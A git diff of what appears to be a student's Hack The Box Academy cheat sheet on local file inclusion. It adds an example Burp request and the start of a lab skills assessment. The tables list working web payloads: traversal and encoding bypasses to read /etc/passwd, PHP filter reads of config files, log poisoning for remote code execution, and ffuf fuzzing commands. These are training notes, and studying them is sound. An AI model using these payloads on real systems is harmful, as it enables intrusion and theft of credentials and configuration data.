@@ -17,7 +17,7 @@
 | **LFI Bypasses** |
 | `/index.php?language=....//....//....//....//....//etc/passwd` | Bypass basic path [traversal filter](https://academy.hackthebox.com/module/23/section/1491) |
 | `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding - [Online URL Decode Encoder](https://www.urldecoder.org/) |
-| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
+| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) [Appended Extension - Path Truncation](https://academy.hackthebox.com/module/23/section/1491) |
 | `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path to filter and truncate the php extension. |
 | `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with `null byte` (obsolete) |
 | `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter - [PHP Filters](https://academy.hackthebox.com/module/23/section/1492) |
@@ -70,7 +70,7 @@
 | `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |
 
 
-## FUZZING LFI Parameters + Files
+## FUZZING LFI Parameters + Files  
 
 | **Command** | **Description** |
 | --------------|-------------------|
@@ -79,7 +79,6 @@
 | `sudo python3 -m http.server <LISTENING_PORT>` | To host our shell.php |
 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzzing for PHP Files |
 | `ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'` | Fuzz page for undocumented web parameters using [FFUF Automated Scanning](https://academy.hackthebox.com/module/23/section/1494) |
-| `GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | After Discovering the web parameter `view`, Burp Suite discovered this LFI |
 | `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Fuzz LFI payloads with [LFI wordlists](https://academy.hackthebox.com/module/23/section/1494) |
 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
@@ -89,6 +88,13 @@
 | [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
 | [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
 | [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |
+
+>Example:
+>After Discovering the web parameter `view`, Burp Suite discovered this LFI
+  
+```
+GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+```
 
 
 ## File Inclusion Functions
@@ -112,3 +118,20 @@
 | `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
 | `Response.WriteFile()` | ✅ | ❌ | ❌ |
 | `include` | ✅ | ✅ | ✅ |
+
+
+# Skills Assessment - File Inclusion  
+
+>[Scenario](https://academy.hackthebox.com/module/23/section/513)  
+>The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. 
+>They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.
+
+>They provided a target IP address and no further information [83.136.252.24:46462](83.136.252.24:46462)  
+
+## Enumeration  
+
+>Identify LFI or file inclusion injection point.  
+
+
+
+
